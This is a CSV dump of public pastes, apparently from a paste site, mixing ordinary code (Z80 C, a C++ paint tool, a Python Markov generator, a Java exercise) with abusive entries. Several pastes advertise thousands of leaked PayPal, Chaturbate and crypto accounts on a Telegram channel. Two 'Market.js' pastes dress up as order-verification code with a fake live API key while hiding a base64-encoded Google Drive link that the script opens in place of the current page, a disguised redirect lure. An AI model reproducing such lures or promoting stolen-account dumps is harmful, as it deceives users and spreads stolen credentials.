id,title,username,language,date,content
dRLYnvKM,dataNone,TestGuy1,JSON,Friday 25th of April 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '67c07570768ba2c96548c49565398a362d7414f00da80e109d64c2e918336e80a8147a0a85a1ed215e28a0b4919b1029048eddca8dfe4221433fd5fea91555ee3866cb32f7f5e06696b72984d921bf37988a0ea280f3bde7926403037f249f5aa0a09fcae935f1918190a455f5135b5f87be86acce148503cb82e96db5653616',
  otherdata: [
    '7adaf759f4d163c17c6665106dd9d5ba',
    'b5663233793d92cda74bddf8c6bc3b2b',
    '8f667f6f6df66050d37394a25038e512',
    '6444d7186a741f4b716aef6ff880b46f',
    '271fa3d52b85ac94ec67b62819adef80',
    '8c10836d09d835143682443b3d386216',
    '693da198a213b065eb94706e6daa0fc8',
    'ef61dd413a27dcd97d54d8104f0846a9'
  ]
}"
7puQLGqT,Untitled,dllbridge,C,Friday 25th of April 2025 05:51:32 AM CDT,"#include <stdint.h>

// Аналог Z80_OUT через ассемблерную вставку
#define PORT_OUT 0x01  // Произвольный порт для вывода

void delay(uint16_t ms) {
    for (uint16_t i = 0; i < ms; i++) {
        for (uint16_t j = 0; j < 100; j++) {
            __asm__(""nop"");  // Задержка с помощью NOP
        }
    }
}

void main() {
    while (1) {
        // Вывод 0x55 в порт PORT_OUT
        __asm
            ld a, #0x55
            out (PORT_OUT), a
        __endasm;
        
        delay(1000);
        
        // Вывод 0xAA в порт PORT_OUT
        __asm
            ld a, #0xAA
            out (PORT_OUT), a
        __endasm;
        
        delay(1000);
    }
}"
7UUJBnGH,PayPal with Balance,dentira,JavaScript,Friday 25th of April 2025 05:50:15 AM CDT,57438 Accounts Posted On https://t.me/leakedbyeminem
WhE7MsPH,Key login,jcel024,Lua,Friday 25th of April 2025 05:42:04 AM CDT,"【Email】juavan【Email】
【pass】juavan【pass】"
6MRH7Tyx,Leaked Accounts - Fresh Hits,dentira,JavaScript,Friday 25th of April 2025 05:34:45 AM CDT,12881 Accounts Posted On https://t.me/leakedbyeminem
0Kg6j3Jb,Simple GDI Paint v1,Kitomas,C++,Friday 25th of April 2025 05:34:18 AM CDT,"#include <public_stuff.hpp>

#include <algorithm>

#define gray(_v) MIN((_v)<<4, 255)



#define color_fg color_history[0]
Color8 color_bg = 0b00000000;
Color8 color_history[17];

Color8 color_hover = 0;

RECT _frame, frame = {CANVAS_W, CANVAS_H, CANVAS_W, CANVAS_H};

Fpoint2d mpos = {CANVAS_W/2, CANVAS_H/2};

Color8 pixdata[CANVAS_W*CANVAS_H];

u32 clear_presses = 0;





/******************************************************************************/

u8 text_hex[16*3] = {
  //0
  0b11111,
  0b10001,
  0b11111,
  //1
  0b00001,
  0b11111,
  0b10001,
  //2
  0b11101,
  0b10101,
  0b10111,
  //3
  0b11111,
  0b10101,
  0b10001,
  //4
  0b11111,
  0b00100,
  0b11100,
  //5
  0b10111,
  0b10101,
  0b11101,
  //6
  0b00111,
  0b00101,
  0b11111,
  //7
  0b11111,
  0b10000,
  0b10000,
  //8
  0b11111,
  0b10101,
  0b11111,
  //9
  0b11111,
  0b10100,
  0b11100,
  //A
  0b11111,
  0b10100,
  0b11111,
  //B
  0b11011,
  0b10101,
  0b11111,
  //C
  0b10001,
  0b10001,
  0b01110,
  //D
  0b01111,
  0b10001,
  0b11111,
  //E
  0b10001,
  0b10101,
  0b11111,
  //F
  0b10000,
  0b10100,
  0b11111,

};





/******************************************************************************/

void draw_hex4(s32 x, s32 y, u8 nybble,
               Color8 color)
{
  nybble &= 15; // Must actually be a nybble
  nybble *= 3;  // Each char is 3 bytes
  nybble += 2;  // The first pixel column is the char's 3rd byte

  const s32 y_start = y;

  for(int _x=0; _x<3; ++_x){
    if(x < 0){  ++x;  continue;  }
    else if(x >= CANVAS_W) break;

    u8 column = text_hex[nybble--];
    y = y_start;

    for(int _y=0; _y<5; ++_y){
      if(y <= -5){  column >>= 1;  ++y;  continue;  }
      else if(y >= CANVAS_H) break;

      if(column&1)
        pixels[PixelCoords(x,y).v] = color;

      column >>= 1;
      ++y;

    }

    ++x;

  }

}



void draw_hex8(s32 x, s32 y, u8 value,
               Color8 color)
{
  draw_hex4(x  , y, value>>4, color);
  draw_hex4(x+4, y, value&15, color);
}



void push_color(Color8 new_color){
  if(color_history[0].v == new_color.v) return;

  for(int i=sizeof(color_history)-1; i>0; --i)
    color_history[i] = color_history[i-1];

  color_history[0] = new_color;

}



void clear_pixdata(){
  memset(&pixdata->v, color_bg.v, CANVAS_W*CANVAS_H);

}


void draw_line_pixdata(s32 x_0, s32 y_0,
                       s32 x_1, s32 y_1,
                       Color8 color)
{
  const s32 d_x =  abs(x_1 - x_0);
  const s32 d_y = -abs(y_1 - y_0);
  const s32 s_x = (x_0<x_1) ? 1 : -1;
  const s32 s_y = (y_0<y_1) ? 1 : -1;
  const s32 s_y_row = s_y * CANVAS_W;

  s32 err = d_x + d_y;

  Color8* dst = &pixdata[x_0 + y_0*CANVAS_W];



  while(true){
    if(  (x_0 >= 0)  &&  (x_0 < CANVAS_W)  &&
         (y_0 >= 0)  &&  (y_0 < CANVAS_H)  )
    {
      dst->v = color.v;
    }

    if(x_0 == x_1  &&  y_0 == y_1) break;
    const s32 err2 = err<<1;

    if(err2 >= d_y){
      err += d_y;
      x_0 += s_x;
      dst += s_x;
    }

    if(err2 <= d_x){
      err += d_x;
      y_0 += s_y;
      dst += s_y_row;
    }

  }

}



void set_color_hover(PixelCoords mpos_addr){
  if(!(mpos.x <  16.0f  &&
       mpos.y >= 64.0f  &&
       mpos.y < (64.0f+8.0f)))
  {
    color_hover = pixels[mpos_addr.v];
  }

}



void set_frame(){
  _frame = frame;

  if(_frame.left   >= _frame.right){ std::swap(_frame.left  , _frame.right); }
  if(_frame.bottom >= _frame.top  ){ std::swap(_frame.bottom, _frame.top  ); }

  _printf(""FRAME {WIDTH, HEIGHT} = {%i, %i}\n"",
          (s32)(_frame.right - _frame.left   + 1),
          (s32)(_frame.top   - _frame.bottom + 1));

}



void draw_rect_colorinc(s32 x, s32 y,
                        s32 w, s32 h)
{
  if(!w || !h) return;

  if(x >= CANVAS_W) return;
  if(y >= CANVAS_H) return;

  if(x <= -w) return;
  if(y <= -h) return;



  const s32 x_start  =  MAX(x, 0);
  const s32 y_start  =  MAX(y, 0);

  const s32 x_upper  =  x + w; // Upper boundary
  const s32 y_upper  =  y + h;

  const s32 x_end  =  MIN(x_upper, CANVAS_W);
  const s32 y_end  =  MIN(y_upper, CANVAS_H);


  #define color (color_inc += 7) //gray( 1+8+((color_inc++)&7) )
  s32 color_inc = 0;

  Color8* n_w  =  pixels;
  n_w  +=  MIN(x_start, CANVAS_W-1);
  n_w  +=  MIN(y_start, CANVAS_H-1) * CANVAS_W;

  Color8* n_e  =  n_w + ((x_end-x_start)-1);
  Color8* s_w  =  n_w + ((y_end-y_start)-1)*CANVAS_W;



  // From north-west, going down
  if(x >= 0){
    Color8* _n_w  =  n_w;
    for(s32 _y=y_start; _y<y_end; ++_y){
      _n_w->v = color;
      _n_w += CANVAS_W;
    }

  }

  // From north-west, going right
  if(y >= 0){
    for(x=x_start; x<x_end; ++x)
      (n_w++)->v = color;

  }

  // From north-east, going down
  if(x_upper < (CANVAS_W+1)){
    for(y=y_start; y<y_end; ++y){
      n_e->v = color;
      n_e += CANVAS_W;
    }

  }

  // From south-west, going right
  if(y_upper < (CANVAS_H+1)){
    for(x=x_start; x<x_end; ++x)
      (s_w++)->v = color;

  }

  #undef color

}





int user_main(int argc, char** argv){
  PixelCoords mpos_addr     = 0;
  PixelCoords mpos_addr_old = 0;
  bool fg_cursor = true;
  bool first_frame_set = true;



  while(!win_closed){
    //Handle events

    Event evt;

    while(pollEvent(&evt))
    switch(evt.type){
      case EVENT_QUIT: return 0; // No break needed



      case EVENT_KEY_DOWN: if(!evt.key.repeat){
        switch(evt.key.vkey){
          case VKEY_1: {
            _select_fg_color:
            if(mpos.x <= 16.0f  &&  mpos.y <= 64.0f)
              push_color(color_hover);
            else if(mpos.x >= 16.0f || mpos.y >= (64.0f+8.0f))
              color_fg = color_hover;
          } break;

          case VKEY_2: {
            _select_bg_color:
            color_bg = color_hover;
          } break;

          case VKEY_0:
          case VKEY_SPACE:
          {
            if((clear_presses++)&1) clear_pixdata();
          } break;

          case VKEY_LBRACKET: {
            if(mpos.x > 16.0f){
              frame.left = (s32)mpos.x;
              frame.top  = (s32)mpos.y;
              if(first_frame_set){
                frame.right  = frame.left;
                frame.bottom = frame.top;
                first_frame_set = false;
              }
              set_frame();
            }
          } break;
          case VKEY_RBRACKET: {
            if(mpos.x > 16.0f){
              frame.right  = (s32)mpos.x;
              frame.bottom = (s32)mpos.y;
              if(first_frame_set){
                frame.left = frame.right;
                frame.top  = frame.bottom;
                first_frame_set = false;
              }
              set_frame();
            }
          } break;

          case VKEY_BSLASH: {
          #ifdef _DEBUG
            Point2d dims = {_frame.right - _frame.left   + 1,
                            _frame.top   - _frame.bottom + 1};

            printf(""// First line is: \""w, h, transparency, 0,0,0,0,0\""\n"");
            printf(""const unsigned char exported_image[] = { "");
            //printf(""const Color8 exported_image[] = { "");

            printf(""%i, %i, 0x%02X, 0,0,0,0,0, // %i Bytes"",
                   dims.x,dims.y, color_bg.v, 8+dims.x*dims.y);

            for(s32 y=_frame.bottom; y<=_frame.top; ++y){
              printf(""\n  "");
              for(s32 x=_frame.left; x<=_frame.right; ++x)
                printf(""0x%02X, "", pixdata[x + y*CANVAS_W].v);
            }

            printf(""\n};\n"");
          #endif
          } break;

          case VKEY_F1:
          case VKEY_BACKSPACE:
          {
            showMessageBox(
              ""Controls:\n""
              ""Middle click to trap cursor, \""esc\"" to release\n""
              ""\n""
              ""Left click to draw with the current foreground color\n""
              ""Right click to draw with the current background color\n""
              ""\n""
              ""Scroll wheel to increment foreground color\n""
              ""\n""
              ""One Key (1) OR X2 mouse click: pick foreground color\n""
              ""Two Key (2) OR X1 mouse click: pick background color\n""
              ""Zero Key (0) OR Space ( ): clear canvas with background color\n""
              ""\n""
              ""Left Square Bracket  ([): set point A of export frame\n""
              ""Right Square Bracket (]): set point B of export frame\n""
              ""Backslash (\\): export contents of frame to stdout""
              , ""Simple GDI Paint  -  Build time:  "" __TIMESTAMP__);
          } break;

          default:;

        }
      } break;



      case EVENT_MOUSE_DOWN:
        clear_presses = 0;
      case EVENT_MOUSE_MOVED:
      {
        bool mdown = evt.type==EVENT_MOUSE_DOWN;
        mpos_addr_old = mpos_addr;
        mpos.x = evt.mouse.x;
        mpos.y = evt.mouse.y;
        mpos_addr = {(u8)mpos.x, (u8)mpos.y};

        u8 button = evt.mouse.button;
        if(button){
          Color8 selected;
          bool draw = true;
          if(     button&MBUTTON_X2 && mdown) goto _select_fg_color;
          else if(button&MBUTTON_X1 && mdown) goto _select_bg_color;
          else if(button&MBUTTON_LEFT){
            if(mpos.x >= 16.0f){ selected = color_fg; fg_cursor= true; }
            else if(mdown){ goto _select_fg_color; }
          } else if(button&MBUTTON_RIGHT){
            if(mpos.x >= 16.0f){ selected = color_bg; fg_cursor=false; }
            else if(mdown){ goto _select_bg_color; }
          }
          else draw = false;

          if(draw){
            draw_line_pixdata(mpos_addr_old.x, mpos_addr_old.y,
                              mpos_addr.x, mpos_addr.y, selected);
          }
        }
      } break;



      case EVENT_MOUSE_VWHEEL: {
        color_fg.v += (s32)evt.mouse.dy;
      } break;



      default:;

    }





    /* - DRAW STUFF - */

    // Copy pixel data
    memcpy(&pixels->v, &pixdata->v, sizeof(pixdata));

    fill_rect(0, 64+8, 8,4, 0b11000111);

    // Color history view (including foreground color)
    for(s32 i=0; i<(s32)sizeof(color_history); ++i)
      fill_rect(0, CANVAS_H-4*(i+1), 8, 4, color_history[i]);

    // Background color view
    fill_rect(8, CANVAS_H-4, 8, 4, color_bg);

    // Grayscale palette view
    for(int y=0; y<=16; ++y)
      fill_rect(8, CANVAS_H-4*(18-y), 8, 4, gray(y));

    // Full palette view
    Color8 c = 0;
    for(int y=0; y<64; y+=2)
    for(int x=0; x<16; x+=2)
    {
      int addr = x + y*CANVAS_W;
      pixels[  addr          ] = c.v; // Bottom-left
      pixels[++addr          ] = c.v; // Bottom-right
      pixels[  addr+=CANVAS_W] = c.v; // Top-right
      pixels[--addr          ] = c.v; // Top-left
      ++c.v;
    }

    // Frame view
    if(!first_frame_set){
      draw_rect_colorinc(_frame.left-1, _frame.bottom-1,
                         _frame.right - _frame.left   + 3,
                         _frame.top   - _frame.bottom + 3);
    }

    // UI border vertical line
    draw_line(16, 0, 16, CANVAS_H, 0b11111111);

    // Whatever color the mouse is currently hovered over
    set_color_hover(mpos_addr);
    fill_rect(0, 64, 16, 8, color_hover);
    draw_hex8(1, 64+1, color_hover.v, gray(17-(color_hover.v>>4)));

    // Cursor
    pixels[mpos_addr.v] = (fg_cursor) ? color_fg : color_bg;



    // Draws the canvas to the window
    canvas_present(true);



    // Waits for about 16ms to approximate 60fps
    timeSleep(16);

  }



  return 0;

}
"
ALj3Mt4g,Market.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 05:31:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72979/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uf5XeHqy,Chaturbate with Tokens,dentira,JavaScript,Friday 25th of April 2025 05:19:22 AM CDT,78276 Accounts Posted On https://t.me/leakedbyeminem
hh7zrJTN,CrapGPT v1,Kitomas,Python,Friday 25th of April 2025 05:19:08 AM CDT,"#!/usr/bin/env python3

from sys import argv, stderr
from os import system as cmd
from math import floor
from os.path import exists
from pprint import pprint
from random import choices, randint



def errFatal(errorString, returnCode = -1):
    print('ERROR: '+errorString, file=stderr)
    exit(returnCode)
    
def rnd(x): return floor(x+0.5) # Python's built-in rounding is stupid

def toInt(x):
    try:              return rnd(eval(x))
    except Exception: return None



wordCount   = toInt(argv[1])  if len(argv) > 1 else 50
fileIn_name = argv[2]         if len(argv) > 2 else 'input.txt'
word        = argv[3].lower() if len(argv) > 3 else None

if wordCount is None:
    errFatal('Word count provided is not an integer value')

if not exists(fileIn_name):
    errFatal(f'File ""{fileIn_name}"" doesn\'t exist!')





def strip_all(s):
    return s.strip("" \""'!?.,;:"").lower()

def split_all(s):
    # Split by line breaks and spaces
    l_0 = ( (' ').join(s.splitlines()) ).split(' ')
    # Split by dashes
    l_1 = ( ('-').join(l_0) ).split('-')
    # Strip each string in list, while culling empty strings
    return [strip_all(_s) for _s in l_1 if _s != '']





def convert_word_dict(d):
    next_words = []
    weights    = []
    
    for k in d:
        next_words.append(k)
        weights.append(d[k])
        
    return [next_words, weights]



def build_dictionary(l):
    if len(l) <= 1: return None

    dict_a = {}

    for i in range(len(l)-1):
        current = l[i  ]
        next    = l[i+1]
        
        if not current in dict_a:
            dict_a[current] = {}
            
        if not next in dict_a[current]:
            dict_a[current][next] = 0
            
        dict_a[current][next] += 1

    dict_b = {}
    
    for word in dict_a:
        dict_b[word] = convert_word_dict(dict_a[word])

    return dict_b



def get_next_word(word, dictionary):
    if not word in dictionary: return None
    words_and_weights = dictionary[word]
    return choices(words_and_weights[0],
                   words_and_weights[1], k=1)[0]





if __name__ == '__main__':
    file = open(fileIn_name, 'r')
    data = split_all(file.read())
    file.close()
    
    dict = build_dictionary(data)
    
    if word is None:
        word = data[ randint(0,len(data)-1) ]
        
    if get_next_word(word, dict) is None:
        errFatal(f'""{word}"" does not have an entry in the word dictionary!')
    
    for i in range(wordCount):
        print(word, end=' ')
        word = get_next_word(word, dict)
        if word is None: word = data[ randint(0,len(data)-1) ]



'''
'youth': {'and': 1,
          'heroes': 1,
          'inclined': 1,
          'into': 1,
          'of': 1,
          'was': 2,
          'who': 1,
          'with': 1},
'''"
3VPKQbJm,[NP] Mister Farenheit,dzocesrce,Java,Friday 25th of April 2025 05:19:00 AM CDT,"/**
 * I partial exam 2016
 */
 import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;
import java.util.Arrays;
import java.util.Comparator;
import java.util.DoubleSummaryStatistics;
import java.util.List;
import java.util.stream.Collectors;


class Temperature implements Comparable<Temperature>{
    int day;
    List<Double> measurements;
    char degrie;

    public Temperature(int day, List<Double> measurements,char degrie) {
        this.day = day;
        this.measurements = measurements;
        this.degrie= degrie;
    }

    public void convertToCelsius(){
        if(degrie=='C')
            return ;
        measurements= measurements.stream().map(i->(((i-32)*5)/9)).collect(Collectors.toList());
        degrie='C';
    }

    public void convertToFarenheit(){
        if(degrie=='F')
            return ;
        measurements= measurements.stream().map(i->(((i*9)/5)+32)).collect(Collectors.toList());
        degrie='F';
    }

    public char getDegrie() {
        return degrie;
    }

    public static Temperature create(String line){
        String[] parts= line.split(""\\s+"");
        int day = Integer.parseInt(parts[0]);
        char degrie = parts[1].charAt(parts[1].length()-1);
        List<Double> measurements= Arrays.stream(parts).skip(1).map(i->Double.parseDouble(i.substring(0,i.length()-1))).collect(Collectors.toList());

        return new Temperature(day,measurements,degrie);
    }
    @Override
    public String toString() {
        DoubleSummaryStatistics doubleSummaryStatistics= measurements.stream().mapToDouble(i->i).summaryStatistics();
        return String.format(""%3d: Count: %3d Min: %6.2f%c Max: %6.2f%c Avg: %6.2f%c"",day,
                doubleSummaryStatistics.getCount(),
                doubleSummaryStatistics.getMin(),
                getDegrie(),
                doubleSummaryStatistics.getMax(),
                getDegrie(),
                doubleSummaryStatistics.getAverage(),
                getDegrie());
    }

    public int getDay() {
        return day;
    }

    @Override
    public int compareTo(Temperature o) {
        return Comparator.comparing(Temperature::getDay).compare(this,o);
    }
}

class DailyTemperatures {
    List<Temperature> temperatureList;

    public DailyTemperatures() {
        temperatureList= new ArrayList<>();
    }

    public void readTemperatures(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        temperatureList= bufferedReader.lines().map(Temperature::create).collect(Collectors.toList());
    }

    public void writeDailyStats(PrintStream out, char c) {
        PrintWriter printWriter= new PrintWriter(out);
        if(c=='C')
            temperatureList.stream().forEach(Temperature::convertToCelsius);
        else{
            temperatureList.stream().forEach(Temperature::convertToFarenheit);
        }
        temperatureList.stream().sorted().forEach(i-> printWriter.println(i));
        printWriter.flush();
    }
}
public class DailyTemperatureTest {
    public static void main(String[] args) {
        DailyTemperatures dailyTemperatures = new DailyTemperatures();
        dailyTemperatures.readTemperatures(System.in);
        System.out.println(""=== Daily temperatures in Celsius (C) ==="");
        dailyTemperatures.writeDailyStats(System.out, 'C');
        System.out.println(""=== Daily temperatures in Fahrenheit (F) ==="");
        dailyTemperatures.writeDailyStats(System.out, 'F');
    }
}

// Vashiot kod ovde"
cBvaH7f7,Untitled,Xp_Isolation,JavaScript,Friday 25th of April 2025 05:06:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22483/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PF6zbtEL,Crypto Accounts,dentira,JavaScript,Friday 25th of April 2025 05:04:01 AM CDT,17627 Accounts Posted On https://t.me/leakedbyeminem
